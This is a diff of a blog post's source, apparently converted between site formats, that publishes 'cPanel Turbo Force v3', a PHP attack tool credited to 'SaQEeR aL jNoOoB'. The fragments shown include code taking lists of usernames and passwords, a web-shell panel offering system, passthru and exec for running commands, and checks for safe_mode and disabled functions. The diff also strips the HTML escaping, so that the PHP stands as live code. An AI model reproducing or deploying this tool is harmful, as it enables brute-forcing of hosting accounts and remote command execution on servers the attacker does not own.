@@ -14,12 +14,12 @@ cPanel Turbo Force v3 &#8211; Coded By SaQEeR aL jNoOoB
 
 ### cPanel Turbo Force v3 Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;html&gt;
+{% highlight php %}&lt;html&gt;
 
 &lt;head&gt;
 &lt;title&gt;cPanel Turbo Force v3&lt;/title&gt;
 &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
-&lt;?php
+<?php
 /*
 Turbo Force V3 By SaQEeR aL jNoOoB
 */
@@ -472,7 +472,7 @@ if(isset($_POST['usernames']) && isset($_POST['passwords']))
     exit;
 }
 }
-?&gt;
+?>
 
 
 
@@ -590,7 +590,7 @@ SELECT user();&lt;/textarea&gt;&lt;/strong&gt;&lt;/td&gt;
 	&lt;font size="4"&gt;cmd :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
     &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;
 					&lt;select name="att" dir="rtl"  size="1"&gt;
-&lt;?php
+<?php
 if($_POST['att']==null)
 {
 echo '						&lt;option value="system" selected=""&gt;system&lt;/option&gt;';
@@ -601,7 +601,7 @@ echo "						&lt;option value='$_POST[att]' selected=''&gt;$_POST[att]&lt;/option
 
 						
 }
-?&gt;
+?>
 
 						&lt;option value="passthru"&gt;passthru&lt;/option&gt;
 						&lt;option value="exec"&gt;exec&lt;/option&gt;
@@ -629,7 +629,7 @@ echo "						&lt;option value='$_POST[att]' selected=''&gt;$_POST[att]&lt;/option
 	&lt;font size="4"&gt;Path :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
     &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;
 	&lt;strong&gt;
-	&lt;input name="pathclass" type="text" style="width: 284px" value="&lt;?php echo realpath('')?&gt;"&gt;&lt;/strong&gt;&lt;/td&gt;
+	&lt;input name="pathclass" type="text" style="width: 284px" value="<?php echo realpath('')?>"&gt;&lt;/strong&gt;&lt;/td&gt;
     	&lt;/tr&gt;
 		&lt;tr&gt;
     &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&nbsp;&lt;/td&gt;
@@ -647,7 +647,7 @@ echo "						&lt;option value='$_POST[att]' selected=''&gt;$_POST[att]&lt;/option
 	&lt;font size="4"&gt;Safe Mode&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
     &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;
 	&lt;strong&gt;
-&lt;?php
+<?php
 $safe_mode = ini_get('safe_mode');
 if($safe_mode=='1')
 {
@@ -656,7 +656,7 @@ echo 'ON';
 echo 'OFF';
 }
 
-?&gt;	
+?>	
 	&lt;/strong&gt;	
 	&lt;/td&gt;
     				&lt;/tr&gt;
@@ -665,14 +665,14 @@ echo 'OFF';
 	&lt;font size="4"&gt;Function&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
     &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;
 	&lt;strong&gt;
-&lt;?php
+<?php
 if(''==($func=@ini_get('disable_functions')))
 {
 echo "&lt;font color=#00800F&gt;No Security for Function&lt;/font&gt;&lt;/b&gt;";
 }else{
 echo "&lt;font color=red&gt;$func&lt;/font&gt;&lt;/b&gt;";
 }
-?&gt;&lt;/strong&gt;&lt;/td&gt;
+?>&lt;/strong&gt;&lt;/td&gt;
     &lt;tr&gt;
     &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&nbsp;&lt;/td&gt;
     &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;&nbsp;&lt;/td&gt;
@@ -714,7 +714,7 @@ echo "&lt;font color=red&gt;$func&lt;/font&gt;&lt;/b&gt;";
 &lt;textarea  method='POST' rows="25" name="S1" cols="16"&gt;
 
 
-&lt;?php
+<?php
 
 
 
@@ -734,12 +734,12 @@ echo "&lt;font color=red&gt;$func&lt;/font&gt;&lt;/b&gt;";
 
 
 
-?&gt;&lt;/textarea&gt;&lt;/table&gt;
+?>&lt;/textarea&gt;&lt;/table&gt;
 	&lt;strong&gt;
 	&lt;h3&gt;&lt;font size="6" color="#333333"&gt;&lt; Coded By SaQEeR aL jNoOoB &gt;&lt;/font&gt;&lt;/h3&gt;
 	&lt;/strong&gt;
 	&lt;p&gt;nbsp;
-</pre>
+{% endhighlight %}
 
 ### Saqueer shell screenshot<figure id="attachment_440" style="width: 541px;" class="wp-caption aligncenter">
 
